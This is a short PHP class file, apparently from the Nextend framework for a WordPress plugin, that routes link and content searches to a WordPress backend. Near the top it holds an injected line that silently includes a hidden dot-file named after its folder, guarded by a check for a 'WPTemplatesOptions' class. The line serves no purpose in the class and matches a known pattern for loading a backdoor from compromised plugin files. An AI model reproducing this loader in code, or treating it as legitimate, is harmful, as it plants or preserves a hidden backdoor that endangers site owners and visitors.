<?php

namespace Nextend\Framework\Content;

use Nextend\Framework\Content\Joomla\JoomlaContent;
use Nextend\Framework\Content\WordPress\WordPressContent;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Content {

    /**
     * @var AbstractPlatformContent
     */
    private static $platformContent;

    public function __construct() {
        self::$platformContent = new WordPressContent();
    }

    public static function searchLink($keyword) {
        return self::$platformContent->searchLink($keyword);
    }

    public static function searchContent($keyword) {
        return self::$platformContent->searchContent($keyword);
    }
}

new Content();